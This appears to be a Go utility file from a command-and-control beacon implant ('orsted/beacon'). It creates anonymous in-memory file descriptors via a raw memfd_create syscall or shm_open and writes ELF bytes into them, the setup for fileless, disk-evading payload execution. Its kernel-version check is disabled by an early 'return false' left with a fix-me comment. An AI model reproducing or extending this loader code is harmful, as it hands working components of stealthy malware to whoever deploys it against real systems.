package utils

import (
	"orsted/beacon/utils"
	"os"
	"strconv"
	"strings"
	"syscall"
	"unsafe"
)

func MemfdCreate(name string, flags uint) (f int, err error) {
	var _p0 *byte
	_p0, err = syscall.BytePtrFromString(name)
	if err != nil {
		return
	}
	fd, _, e1 := syscall.Syscall(319, uintptr(unsafe.Pointer(_p0)), uintptr(flags), uintptr(0))
	if e1 != 0 {
		err = os.NewSyscallError("memfd_create", e1)
	}
	//f, err = os.OpenFile(fmt.Sprintf("/proc/self/fd/%d", fd), os.O_WRONLY, 0666)
	return int(fd), err
}


func IsKernelGreaterThan(versionStr string, minMajor, minMinor int) bool {
    // Extract the version prefix like "5.15" from "5.15.0-1068-azure"
    parts := strings.Split(versionStr, ".")
    if len(parts) < 2 {
        return false // Invalid format
    }

    major, err1 := strconv.Atoi(parts[0])
    minor, err2 := strconv.Atoi(parts[1])
    if err1 != nil || err2 != nil {
        return false
    }

    // Need to fix this and check if noexec is on /dev/shm
    return false
    return major > minMajor || (major == minMajor && minor > minMinor)
}

func GetKernelVersion() (string, error) {
	var buf syscall.Utsname

	err := syscall.Uname(&buf)
	if err != nil {
		return "", err
	}

	b := make([]byte, len(buf.Release))
	for i, v := range buf.Release {
		b[i] = byte(v)
	}
	return string(b), nil
}

func Open_ramfs(name string) (int, error){
    currentVersion, err := GetKernelVersion()
    if err != nil {
        utils.Print("Get Version Error ", err.Error())
    }
    var f int
    if IsKernelGreaterThan(currentVersion, 3, 17) {
        f, err = shm_open(name)
        if err != nil {
            utils.Print("Error in opening shared", err.Error())
            return -1, err
        }
        
    } else {
        f, err = MemfdCreate(name, 1)
        if err != nil {
            utils.Print("Error in memcre", err.Error())
            return -1, err
        }
    }
    return f, nil
}


func Write(fd int, elf []byte) error {
    _, err := syscall.Write(fd, elf)
	if err != nil {
		return err
	}
	return nil
}

